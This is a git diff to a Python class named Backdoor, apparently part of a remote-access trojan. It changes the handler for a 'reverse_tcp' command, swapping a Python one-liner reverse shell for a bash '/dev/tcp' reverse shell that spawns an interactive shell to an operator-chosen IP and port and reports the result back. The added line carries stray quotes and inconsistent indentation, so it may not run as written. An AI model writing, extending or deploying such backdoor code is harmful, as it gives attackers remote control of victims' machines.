@@ -198,11 +198,13 @@ class Backdoor:
                     if message_command_descrypt.startswith("reverse_tcp "):
                         reverseip = message_command_descrypt.split(" ")[1]
                         reverseport = message_command_descrypt.split(" ")[2]
-                        subprocess.check_output(
-                            f"""python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{reverseip}",{reverseport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-                        """, stderr=subprocess.STDOUT, shell=True)
-                        self.sock.send("Reverse Shell Session established with sucess!".encode())
-
+                        try:
+	                        subprocess.check_output(
+	                            f"""bash -i >& /dev/tcp/{reverseip}/{reverseport} 0>&1''
+	                        """, stderr=subprocess.STDOUT, shell=True)
+	                        self.sock.send("Reverse Shell Session established with sucess!".encode())
+	                    except:
+	                    	self.sock.send("Something went wrong! Maybe the target is a windows!".encode())
                     # Sending Screenshot
 
                     if message_command_descrypt == "screenshot":
